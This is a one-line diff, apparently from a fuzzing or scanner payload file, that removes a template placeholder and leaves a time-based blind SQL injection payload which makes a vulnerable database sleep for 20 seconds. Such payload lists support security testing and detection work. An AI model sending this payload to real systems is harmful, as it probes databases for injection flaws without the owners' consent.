@@ -1,1 +1,1 @@
-{{.original}}0"XOR(if(now()=sysdate(),sleep(20),0))XOR"Z
+0"XOR(if(now()=sysdate(),sleep(20),0))XOR"Z
